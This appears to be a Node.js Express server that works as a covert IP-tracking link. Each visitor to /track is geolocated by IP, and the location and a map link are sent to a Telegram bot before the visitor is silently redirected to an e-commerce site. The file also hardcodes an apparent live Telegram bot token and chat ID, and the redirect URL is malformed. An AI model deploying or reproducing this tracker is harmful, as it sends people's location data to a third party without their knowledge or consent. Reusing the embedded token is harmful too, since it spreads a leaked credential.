const express = require('express');
const axios = require('axios');
const fs = require('fs');
const app = express();

const PORT = 3002;
const LOG_FILE = 'logs.json';
const WHOIS_API = 'https://ipwho.is/';

app.get('/track', async (req, res) => {
  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;

  try {
    const response = await axios.get(`${WHOIS_API}${ip}`);
    const data = response.data;

    const logEntry = {
      ip,
      timestamp: new Date().toISOString(),
      location: {
        country: data.country,
        region: data.region,
        city: data.city,
        latitude: data.latitude,
        longitude: data.longitude
      }
    };

    // 🔽 Envoi Telegram
    const message = `
🌍 Nouvelle IP trackée

Date : ${logEntry.timestamp}
IP : ${logEntry.ip}
Pays : ${logEntry.location.country}
Ville : ${logEntry.location.city}
Coordonnées : ${logEntry.location.latitude}, ${logEntry.location.longitude}
[Voir sur Google Maps](https://www.google.com/maps?q=${logEntry.location.latitude},${logEntry.location.longitude})
`;

    await axios.post(`https://api.telegram.org/bot7904744649:AAGvk_DzuGJ_Fd8e2TsP18rENP3xPFQEEEs/sendMessage`, {
      chat_id: 5070991962,
      text: message,
      parse_mode: 'Markdown'
    });

    // 💾 Enregistrement dans logs.json (facultatif mais utile)
    let logs = [];
    if (fs.existsSync(LOG_FILE)) {
      const fileData = fs.readFileSync(LOG_FILE);
      logs = JSON.parse(fileData);
    }

    logs.push(logEntry);
    fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2));

    // 🚀 Redirection vers le site e-commerce
    res.redirect('https://https://iziway.cm/');
  } catch (error) {
    console.error('Erreur WHOIS ou Telegram:', error.message);
    res.status(500).send('Erreur lors du tracking.');
  }
});

app.listen(PORT, () => {
  console.log(`Serveur en écoute sur http://localhost:${PORT}/track`);
});
